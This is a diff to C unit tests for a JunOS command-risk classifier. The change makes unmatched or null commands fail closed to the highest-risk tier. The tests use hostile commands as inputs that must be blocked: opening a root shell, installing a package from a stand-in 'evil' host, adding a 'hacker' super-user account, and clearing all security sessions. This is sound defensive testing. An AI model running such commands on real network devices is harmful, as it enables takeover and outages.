@@ -277,8 +277,12 @@ static void test_command_routing(void)
     PASS();
 
     /* Default */
-    TEST("unmapped command → YELLOW");
-    assert(junos_route_command("show snmp mib walk jnxOperatingTable") == VIRP_TIER_YELLOW);
+    /* RELIER on the old YELLOW default — NOT added to the table.
+     * This is a legitimate command that was never listed; it executed
+     * only because the no-match default cleared the gate. Now RED.
+     * Listing it is a deliberate tier decision, not a bug fix. */
+    TEST("unmapped: show snmp mib walk → RED (fail closed)");
+    assert(junos_route_command("show snmp mib walk jnxOperatingTable") == VIRP_TIER_RED);
     PASS();
 
     TEST("set system host-name → RED (bare 'set ' catch-all, no write rides YELLOW)");
@@ -289,8 +293,8 @@ static void test_command_routing(void)
     assert(junos_route_command("set system login user hacker class super-user") == VIRP_TIER_RED);
     PASS();
 
-    TEST("null command → YELLOW");
-    assert(junos_route_command(NULL) == VIRP_TIER_YELLOW);
+    TEST("null command → RED (fail closed)");
+    assert(junos_route_command(NULL) == VIRP_TIER_RED);   /* fail closed */
     PASS();
 }
 
@@ -580,6 +584,38 @@ static void test_legit_matches_unaffected(void)
     assert(junos_route_command("request system reboot") == VIRP_TIER_BLACK); PASS();
 }
 
+
+/* =========================================================================
+ * No-match default must FAIL CLOSED (P0)
+ *
+ * JunOS's classifier returned YELLOW when no table entry matched. The
+ * default gate threshold is YELLOW, so an unlisted command CLEARED the
+ * gate and executed. Only the Cisco classifier failed closed to RED.
+ *
+ * Each command below is plausible, unlisted, and state-changing or
+ * sensitive — every one of them executed before this change.
+ * ========================================================================= */
+
+static void test_no_match_fails_closed(void)
+{
+    printf("\n=== No-match default fails closed to RED ===\n");
+
+    TEST("unlisted: start shell -> RED (drops to a root shell)");
+    assert(junos_route_command("start shell") == VIRP_TIER_RED); PASS();
+
+    TEST("unlisted: request system software add http://evil/pkg -> RED (installs an arbitrary package)");
+    assert(junos_route_command("request system software add http://evil/pkg") == VIRP_TIER_RED); PASS();
+
+    TEST("unlisted: restart routing -> RED (restarts the routing daemon)");
+    assert(junos_route_command("restart routing") == VIRP_TIER_RED); PASS();
+
+    TEST("unlisted: clear security flow session all -> RED (tears down every active session)");
+    assert(junos_route_command("clear security flow session all") == VIRP_TIER_RED); PASS();
+
+    TEST("NULL command -> RED (fail closed)");
+    assert(junos_route_command(NULL) == VIRP_TIER_RED); PASS();
+}
+
 int main(void)
 {
     printf("VIRP Juniper JunOS Driver — Unit Tests\n");
@@ -594,6 +630,7 @@ int main(void)
 
     test_adversarial_separators();
     test_legit_matches_unaffected();
+    test_no_match_fails_closed();
     printf("\n=======================================\n");
     printf("Results: %d/%d passed\n", tests_passed, tests_run);
 
